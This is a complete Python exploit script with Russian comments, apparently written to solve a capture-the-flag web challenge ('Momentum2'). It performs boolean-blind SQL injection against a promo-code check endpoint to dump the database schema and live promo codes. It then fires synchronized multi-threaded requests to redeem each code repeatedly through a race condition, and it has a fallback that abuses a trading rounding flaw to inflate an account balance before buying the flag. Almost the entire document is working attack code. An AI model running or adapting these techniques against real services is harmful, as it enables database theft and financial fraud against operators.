#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Momentum2 — самодостаточный скрипт. Только stdlib, ничего ставить не нужно.

    python3 m2.py            # авто: дамп БД -> гонка на живых промокодах -> покупка
    python3 m2.py probe      # только диагностика БД (быстро, read-only)
    python3 m2.py race 120   # залп 120 потоками
    python3 m2.py grind      # запасной путь: +1 ₽ за сделку до 250 000 ₽ (~60 мин)

Адрес контейнера задан в BASE; можно переопределить переменной окружения M2_BASE.
Аккаунт скрипт создаёт сам, cookie не нужен.
"""

import os
import re
import sys
import json
import time
import random
import string
import socket
import ssl
import threading
import http.client
import urllib.parse

BASE = os.environ.get(
    "M2_BASE",
    "https://4fc999215e4d4971.xn--80aqf1ad.xn--r1aee.xn--80afol2bmm.xn--p1acf",
).rstrip("/")
HOST = urllib.parse.urlsplit(BASE).hostname
PORT = urllib.parse.urlsplit(BASE).port or 443
TLS = urllib.parse.urlsplit(BASE).scheme == "https"
TARGET = 25_000_000          # копеек = 250 000 ₽
TARGET_RUB = TARGET // 100
PASS = "Pa55word!x"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36"

COOKIE = ""
LOCK = threading.Lock()


# --------------------------------------------------------------- утилиты

def js(s):
    """Разэкранировать \\uXXXX."""
    return re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), s)


def plain(s):
    s = js(s)
    s = re.sub(r"<script.*?</script>", " ", s, flags=re.S | re.I)
    s = re.sub(r"<[^>]+>", " ", s)
    return re.sub(r"\s+", " ", s).strip()


def new_conn(timeout=30):
    if TLS:
        ctx = ssl.create_default_context()
        return http.client.HTTPSConnection(HOST, PORT, timeout=timeout, context=ctx)
    return http.client.HTTPConnection(HOST, PORT, timeout=timeout)


def raw_req(method, path, body=None, cookie=None, conn=None, timeout=30):
    """Запрос; возвращает (status, text, set_cookie_list). Соединение закрывается."""
    own = conn is None
    c = conn or new_conn(timeout)
    headers = {"Host": HOST, "User-Agent": UA, "Accept": "*/*", "Connection": "close"}
    if cookie:
        headers["Cookie"] = cookie
    if body is not None:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    try:
        c.request(method, path, body=body, headers=headers)
        r = c.getresponse()
        data = r.read().decode("utf-8", "replace")
        sc = r.getheaders()
        return r.status, data, sc
    except Exception as e:
        return 0, f"{type(e).__name__}: {e}", []
    finally:
        if own:
            try:
                c.close()
            except Exception:
                pass


def update_cookie(set_cookie_headers):
    """Копим куки из ответов (Set-Cookie)."""
    global COOKIE
    jar = {}
    for part in COOKIE.split("; "):
        part = part.strip()
        if not part:
            continue
        if "=" in part:
            k, v = part.split("=", 1)
            jar[k] = v
    for k, v in set_cookie_headers:
        if k.lower() == "set-cookie":
            first = v.split(";", 1)[0]
            if "=" in first:
                name, val = first.split("=", 1)
                jar[name.strip()] = val.strip()
    COOKIE = "; ".join(f"{k}={v}" for k, v in jar.items())


def req(method, path, data=None, timeout=30):
    body = urllib.parse.urlencode(data) if data is not None else None
    st, txt, sc = raw_req(method, path, body, COOKIE, timeout=timeout)
    update_cookie(sc)
    return st, txt


def balance():
    _, raw = req("GET", "/profile")
    m = re.search(r"([\d][\d\s\u00a0]{0,14})\s*₽", plain(raw))
    return int(re.sub(r"\D", "", m.group(1)) or 0) if m else 0


# --------------------------------------------------------------- оракул SQLi

CALLS = {"n": 0}


def oracle(sql, retries=3):
    """Булев ответ /api/v1/promo/check на инъекцию."""
    url = "/api/v1/promo/check?code=" + urllib.parse.quote("' OR (" + sql + ")--")
    for _ in range(retries):
        CALLS["n"] += 1
        st, raw = req("GET", url)
        if st == 200:
            try:
                return bool(json.loads(raw).get("available"))
            except Exception:
                m = re.search(r'"available"\s*:\s*(true|false)', raw)
                if m:
                    return m.group(1) == "true"
        time.sleep(0.15)
    return None


def sql_len(expr, hi=8000):
    e = "length(ifnull((%s),''))" % expr
    lo = 0
    while lo < hi:
        mid = (lo + hi + 1) // 2
        v = oracle("%s>=%d" % (e, mid))
        if v is None:
            return None
        if v:
            lo = mid
        else:
            hi = mid - 1
    return lo


def sql_str(expr, label=""):
    n = sql_len(expr)
    if n is None:
        return None
    if n == 0:
        return ""
    out = []
    for i in range(1, n + 1):
        lo, hi = 0, 0x2FFFF
        while lo < hi:
            mid = (lo + hi + 1) // 2
            v = oracle("unicode(substr(ifnull((%s),''),%d,1))>=%d" % (expr, i, mid))
            if v is None:
                return "".join(out) + "<ERR>"
            if v:
                lo = mid
            else:
                hi = mid - 1
        out.append(chr(lo))
        if label and i % 40 == 0:
            print("    [%s] %d/%d" % (label, i, n))
            sys.stdout.flush()
    return "".join(out)


CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_@|:-./"


def sql_char_fast(expr, i):
    """Символ через instr по алфавиту: ~6 запросов вместо ~18 на полный Unicode."""
    idx = "instr('%s',substr(ifnull((%s),''),%d,1))" % (CHARSET, expr, i)
    if not oracle("%s>=1" % idx):
        return None
    lo, hi = 1, len(CHARSET)
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle("%s>=%d" % (idx, mid)):
            lo = mid
        else:
            hi = mid - 1
    return CHARSET[lo - 1]


def sql_str_fast(expr, label=""):
    n = sql_len(expr)
    if n is None:
        return None
    if n == 0:
        return ""
    out = []
    for i in range(1, n + 1):
        ch = sql_char_fast(expr, i)
        if ch is None:
            ch = sql_char_full(expr, i)
        out.append(ch)
    return "".join(out)


def sql_char_full(expr, i):
    lo, hi = 0, 0x2FFFF
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle("unicode(substr(ifnull((%s),''),%d,1))>=%d" % (expr, i, mid)):
            lo = mid
        else:
            hi = mid - 1
    return chr(lo)


def sql_count(expr):
    lo, hi = 0, 200000
    while lo < hi:
        mid = (lo + hi + 1) // 2
        v = oracle("ifnull((%s),-1)>=%d" % (expr, mid))
        if v is None:
            return -1
        if v:
            lo = mid
        else:
            hi = mid - 1
    return lo


def live_codes_fast():
    """Только коды с uses_left>0. В разы дешевле полного дампа: десятки запросов вместо тысяч."""
    n = sql_count("SELECT count(*) FROM promos WHERE uses_left>0")
    print("  живых строк: %s" % n)
    if not n or n < 1:
        return []
    d = sql_str_fast("SELECT group_concat(code||'@'||uses_left,'|') FROM promos WHERE uses_left>0")
    out = []
    for part in (d or "").split("|"):
        if "@" in part:
            c, u = part.rsplit("@", 1)
            try:
                out.append((c, int(u)))
            except ValueError:
                pass
    for c, u in out:
        print("    %-14s uses_left=%d" % (c, u))
    return out


def dump_db(quick=True):
    """Вытащить схему и таблицу промокодов. quick=True — не трогать таблицы без code."""
    print("=" * 70)
    print("ДАМП БД через blind SQLi")
    print("=" * 70)
    t, f = oracle("1=1"), oracle("1=2")
    print("  оракул: 1=1 -> %s | 1=2 -> %s" % (t, f))
    if not (t and f is False):
        print("  !! оракул не работает")
        return []

    names = sql_str("SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table'")
    print("  таблицы: %r" % names)
    if not quick:
        schema = sql_str("SELECT group_concat(sql,' ;; ') FROM sqlite_master")
        print("  схема: %s" % schema)

    rows = []
    for tbl in [x for x in (names or "").split("|") if x and "sqlite" not in x]:
        cols_s = sql_str("SELECT group_concat(name,',') FROM pragma_table_info('%s')" % tbl) or ""
        cols = [c.strip() for c in cols_s.split(",") if c.strip()]
        if quick and "code" not in cols:
            print("  [%s] колонки=%s — пропускаю (нет code)" % (tbl, cols))
            continue
        try:
            cnt = sql_count("SELECT count(*) FROM %s" % tbl)
        except Exception:
            cnt = -1
        print("  [%s] строк=%s колонки=%s" % (tbl, cnt, cols))
        if "code" not in cols:
            print("      (нет колонки code — пропуск)")
            continue
        if not cols:
            continue
        if "code" in cols:
            extra = "||'@'||ifnull(uses_left,'?')" if "uses_left" in cols else ""
            d = sql_str("SELECT group_concat(code%s,'|') FROM %s" % (extra, tbl), tbl) or ""
            for part in d.split("|"):
                if not part:
                    continue
                if "@" in part:
                    c, u = part.rsplit("@", 1)
                    try:
                        ui = int(u)
                    except ValueError:
                        ui = -1
                else:
                    c, ui = part, None
                rows.append((tbl, c, ui))
                print("      %-12s uses_left=%s" % (c, ui))

    print("  запросов к оракулу: %d" % CALLS["n"])
    return rows


# --------------------------------------------------------------- аккаунт

def fresh_account():
    global COOKIE
    COOKIE = ""
    req("GET", "/logout")
    user = "m" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    req("POST", "/register", {"username": user, "password": PASS})
    req("POST", "/login", {"username": user, "password": PASS})
    _, raw = req("GET", "/profile")
    print("  аккаунт %s | имя в профиле: %s | баланс %d ₽"
          % (user, "ДА" if user in js(raw) else "НЕ НАЙДЕНО", balance()))
    return user


# --------------------------------------------------------------- гонка

def volley(n, code):
    """N предварительно открытых TLS-соединений, старт по барьеру."""
    conns = [None] * n
    results = [None] * n
    ready = threading.Barrier(n + 1)
    fire = threading.Event()

    def prep(i):
        try:
            c = new_conn(30)
            c.connect()
            conns[i] = c
        except Exception:
            conns[i] = None
        try:
            ready.wait(timeout=60)
        except Exception:
            return
        fire.wait(60)
        c = conns[i]
        if c is None:
            results[i] = (0, "no-conn")
            return
        body = urllib.parse.urlencode({"code": code})
        try:
            c.request("POST", "/promo/redeem", body=body, headers={
                "Host": HOST, "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": COOKIE, "User-Agent": UA, "Accept": "*/*",
            })
            r = c.getresponse()
            results[i] = (r.status, r.read().decode("utf-8", "replace"))
        except Exception as e:
            results[i] = (0, "%s: %s" % (type(e).__name__, e))
        finally:
            try:
                c.close()
            except Exception:
                pass

    ts = [threading.Thread(target=prep, args=(i,), daemon=True) for i in range(n)]
    for t in ts:
        t.start()
    try:
        ready.wait(timeout=60)
    except Exception:
        print("  !! не все соединения открылись, стреляем как есть")
    fire.set()
    for t in ts:
        t.join(120)

    hits, credited, errs = 0, 0, {}
    for r in results:
        if not r:
            errs["нет ответа"] = errs.get("нет ответа", 0) + 1
            continue
        st, txt = r
        d = js(txt)
        m = re.search(r'"credited"\s*:\s*(\d+)', d)
        if m:
            hits += 1
            credited += int(m.group(1))
        else:
            e = re.search(r'"error"\s*:\s*"([^"]*)"', d)
            k = "%s:%s" % (st, e.group(1) if e else plain(d)[:50])
            errs[k] = errs.get(k, 0) + 1
    return hits, credited, errs


# --------------------------------------------------------------- гринд

def grind(threads=32, seconds=4200):
    """amount=1, multiplier=1.01 -> +1 ₽ за сделку. Keep-alive на поток."""
    start_bal = balance()
    print("=" * 70)
    print("ГРИНД: ставка 1 ₽, множитель 1.01 | старт %d ₽ | цель %d ₽" % (start_bal, TARGET_RUB))
    print("=" * 70)

    stop = threading.Event()
    stats = {"trades": 0, "wins": 0, "loss": 0, "err": {}}
    errlock = threading.Lock()
    peak = {"v": start_bal}
    t0 = time.time()

    def worker():
        c = new_conn(30)
        body = urllib.parse.urlencode({
            "asset": "RUB/USD", "direction": "up", "amount": "1", "multiplier": "1.01",
        })
        while not stop.is_set():
            try:
                if c.sock is None:
                    c.connect()
                c.request("POST", "/trade", body=body, headers={
                    "Host": HOST, "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": COOKIE, "User-Agent": UA, "Accept": "*/*",
                })
                r = c.getresponse()
                d = r.read().decode("utf-8", "replace")
                try:
                    j = json.loads(js(d))
                except Exception:
                    j = {}
                if "won" not in j:
                    # это не сделка, а ошибка (нет средств / лимит / не та сессия)
                    e = j.get("error") or plain(d)[:60]
                    with errlock:
                        stats["err"][e] = stats["err"].get(e, 0) + 1
                    if any(w in str(e).lower() for w in ("средств", "войдите", "баланс")):
                        stop.set()
                    time.sleep(0.05)
                    continue
                with LOCK:
                    stats["trades"] += 1
                    if j.get("won"):
                        stats["wins"] += 1
                    b = j.get("balance")
                    if isinstance(b, int):
                        b //= 100
                        if b > peak["v"]:
                            peak["v"] = b
                        if b >= TARGET_RUB:
                            stop.set()
                        if b < peak["v"] - 5000:
                            print("  !! просадка: %d ₽ при пике %d ₽ — стоп" % (b, peak["v"]))
                            stop.set()
            except Exception as e:
                try:
                    c.close()
                except Exception:
                    pass
                c = new_conn(30)
                time.sleep(0.05)

    ts = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in ts:
        t.start()

    while not stop.is_set() and time.time() - t0 < seconds:
        time.sleep(10)
        el = time.time() - t0
        b = balance()
        print("  %5.0f с | сделок %6d | %5.1f сд/с | выигрышей %6d | баланс %6d ₽ | осталось %d ₽"
              % (el, stats["trades"], stats["trades"] / el, stats["wins"], b, max(0, TARGET_RUB - b)))
        if stats["err"]:
            top = sorted(stats["err"].items(), key=lambda x: -x[1])[:2]
            print("       ошибки: %s" % top)
        sys.stdout.flush()
        if b >= TARGET_RUB:
            stop.set()
    stop.set()
    for t in ts:
        t.join(5)
    return balance()


# --------------------------------------------------------------- покупка

def buy():
    st, raw = req("POST", "/profile/buy")
    print("\nPOST /profile/buy -> %s" % st)
    flags = re.findall(r"flag\{[^}]+\}", js(raw))
    print("ФЛАГИ: %s" % flags)
    m = re.search(r"(элит\w*[^.]{0,240}|код участника[^.]{0,240})", plain(raw), re.I)
    print("текст: %s" % (m.group(1) if m else plain(raw)[:240]))
    if not flags:
        _, prof = req("GET", "/profile")
        print("флаги в профиле: %s" % re.findall(r"flag\{[^}]+\}", js(prof)))
    return flags


# --------------------------------------------------------------- main

def main():
    args = sys.argv[1:]
    mode = args[0] if args and not args[0].isdigit() else "auto"
    n = next((int(a) for a in args if a.isdigit()), 60)
    print("BASE = %s\nрежим = %s\n" % (BASE, mode))

    if mode in ("probe",):
        dump_db(quick=False)
        return

    if mode == "grind":
        fresh_account()
        b = grind(threads=32)
        if b >= TARGET_RUB:
            buy()
        return

    if mode == "rate":
        fresh_account()
        print("замер: 20 с гриндa на 32 keep-alive потоках\n")
        b0 = balance()
        grind(threads=32, seconds=20)
        b1 = balance()
        print("\nитог замера: %d -> %d ₽ (дельта %d ₽)" % (b0, b1, b1 - b0))
        return

    if mode == "race":
        fresh_account()
        hits, credited, errs = volley(n, os.environ.get("M2_CODE", "0OKVRCRTKC"))
        print("  начислений %d/%d | +%.0f ₽" % (hits, n, credited / 100))
        for k, v in sorted(errs.items(), key=lambda x: -x[1])[:4]:
            print("    %4d × %s" % (v, k))
        b = balance()
        print("  баланс: %d ₽" % b)
        if b >= TARGET_RUB:
            buy()
        return

    # auto
    print("=" * 70)
    print("ЖИВЫЕ ПРОМОКОДЫ (быстрый запрос, без полного дампа)")
    print("=" * 70)
    t, f = oracle("1=1"), oracle("1=2")
    if not (t and f is False):
        print("  оракул не работает")
        return
    live = [c for c, u in live_codes_fast()]
    print("  запросов к оракулу: %d" % CALLS["n"])
    print("\nживых кодов: %s" % live)

    if not live:
        print("\nВсе промокоды исчерпаны. Остаётся только гринд:")
        print("  python3 m2.py grind     # +1 ₽ за сделку, ~60 мин до 250 000 ₽")
        return

    print()
    fresh_account()
    for code in live:
        print("\n--- гонка: %d потоков на код %s ---" % (n, code))
        t0 = time.time()
        hits, credited, errs = volley(n, code)
        print("  %.2f с | начислений %d/%d | +%.0f ₽" % (time.time() - t0, hits, n, credited / 100))
        for k, v in sorted(errs.items(), key=lambda x: -x[1])[:4]:
            print("    %4d × %s" % (v, k))
        b = balance()
        print("  баланс: %d ₽" % b)
        if b >= TARGET_RUB:
            buy()
            return

    b = balance()
    print("\nитог: %d ₽ (не хватило %d ₽)" % (b, max(0, TARGET_RUB - b)))
    if b >= TARGET_RUB:
        buy()


if __name__ == "__main__":
    main()
